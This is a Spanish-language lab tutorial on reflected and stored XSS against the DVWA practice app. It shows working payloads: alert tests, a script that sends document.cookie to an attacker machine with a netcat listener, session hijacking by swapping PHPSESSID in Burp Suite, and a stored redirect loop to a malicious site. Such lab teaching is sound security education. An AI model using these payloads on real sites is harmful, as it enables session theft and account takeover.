# Empecemos con las pruebas  XSS


Muy bien para empezar necesitaremos tener la maquina de DVWA abierta. prodemos tener la maquina atraves de  tryhackme o por docker.

Vamos a iniciar por XSS reflect, acordarse que en la maquina de DVWA de poner el modo de seguridad en nivel low para que funcione las pruebas que vamos a hacer.

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled.png)

Luego nos iremos al apartado XSS Reflected, aqui haremos primero una prueba muy simple.

 

```bash
<script>alert ("hola soy un ataque xss") </script> 
```

Si lo ponemos en el cuador de texto de “what`s your name?” vamos a ver que ocurre.

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%201.png)

Como podemos ver nos suelta, una alerta que nos da el código que hemos introducido.

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%202.png)

También podemos hacerlo un poco mas interesante por ejemplo que nos saque la IP del servidor.

```bash
<script>alert(document.domain)</script>
```

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%203.png)

Con esto el atacante también podría hacer un ataque directamente a la ip del servidor.

Vamos a hacerlo aun mucho mas interesante porque vamos a coger de una forma “prestada” una cookie de sesión.

vamos a utilizar este codigo.

Este código lo que hace es que estamos utilizando código javascrit, y que le estamos creando un nuevo  objeto de la clase image, luego esta imagen con la propiedad src apunta a la URL especifica que incluye a donde le vamos a querer que envié la cookie y lo que queremos enviar que es la cookie de sesión que se aloja en document.cookie

```bash
<script>new Image().src="http://192.168.1.155/bogus.php?output="+document.cookie;</script>   
```

Acordarse cambiar la ip por la maquina de vuestro kali, y poner el kali en modo bridge.

ahora vamos a dejar nuestro kali preparado y levantado para que empiece a escuchar y nos llegue la cookie de sesión.

para dejarlo en modo escucha, en una terminal ponemos 

```bash
nc -vnlp 80
```

y una vez alguien le de click a la url o le demos al boton submit enviara la cookie.

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%204.png)

Una vez esto abriremos nuestro burpsuite. abriremos nuestro burpsuite para poder interceptar las peticiones de nuestro navegador al servidor y viceversa y poder llegar a modificar la cookie. esto lo que hará es que podamos tener acceso a la pagina de DVWA sin haber iniciado sesión.

 Pondremos el burpsuite a interceptar paquetes dandole a la opcion “intercept is on”

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%205.png)

Como podemos ver en esta imagen no estoy logueado en ningún momento en DVWA

Ahora si nosotros escribimos y queremos que nos redirija a esa url que existe de la maquina.

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%206.png)

el burpsuite nos saltara 

y debemos de modificar el apartado de la cookie por la nueva cookie

Antigua

---

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%207.png)

Nueva

---

Solo cambiamos el PHPSESSID= ques donde va a ir la cookie.

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%208.png)

esto para guion

listo ya tendríamos acceso si haber logueado sesión anteriormente

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%209.png)

Al Obtener la cookie de sesión el atacante.

Bueno ya que creo que con esto os a picado la curiosidad vamos a pasar al XSS stored el almacenado, no tiene mucho misterio ya que lo que ocurre es que el código malicioso se quedaría guardado en el servidor es decir que cada vez que se vuelva a recargar la pagina se va a ejecutar y quien intente acceder a esa pagina también va a ejecutar el código malicioso.

 Asi que nos vamos al apartado de XSS Stored 

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%2010.png)

Recordad que si por algun casual en DVWA no os deja escribir muchas letras, en inspeccionar elemento se puede cambiar la longitud máxima de caracteres.

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%2011.png)

Volviendo al XSS stored el codigo practicamente es el mismo que el XSS reflect solo que de por si se guarda. para hacer que cada vez que una persona que recargue la pagina le salga un alert.

```bash
<script>alert("hola esto es un xss stored")</script>
```

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%2012.png)

ahora la cosa esque esto se va a repetir continuamente cada vez que se recargue la pagina.

igual que anteriormente con xss reflect podemos tambien que renvie cookie de sesión pero lo que vamos a hacer es imaginar que el atacante quiere denegar el servicio a esta pagina. una de las formas para hacer esto podria ser con este codigo malicioso

```bash
<script>
    while (true) {
        window.location = "http://mi-sitio-malicioso.com/";
    }
</script>
```

Como veis nos sigue redirigiendo a mi sitio [malicioso.com](http://malicioso.com) 🙂

![Untitled](/img/xss/Empecemos%20con%20las%20pruebas%20XSS%20b48350b9fcd2416eab21cfe1b29a4529/Untitled%2013.png)

ya lo demas es exactamente igual que el XSS reflect
